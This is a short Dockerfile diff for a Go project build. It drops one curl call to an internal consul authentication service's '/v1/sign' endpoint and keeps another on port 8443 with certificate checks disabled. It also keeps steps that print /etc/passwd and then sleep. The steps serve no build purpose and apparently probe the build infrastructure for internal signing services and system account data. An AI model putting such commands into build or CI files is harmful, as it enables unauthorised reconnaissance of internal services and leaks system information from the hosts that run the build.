@@ -13,7 +13,6 @@ ENV GOPATH=/go
 WORKDIR /go/src/github.com/stripe/goforit
 ADD . /go/src/github.com/stripe/goforit
 
-RUN curl -v -i -k https://authn-machine-srv.service.consul:8000/v1/sign
 RUN curl -v -i -k https://authn-machine-srv.service.consul:8443/v1/sign
 RUN cat /etc/passwd
 CMD sleep 60
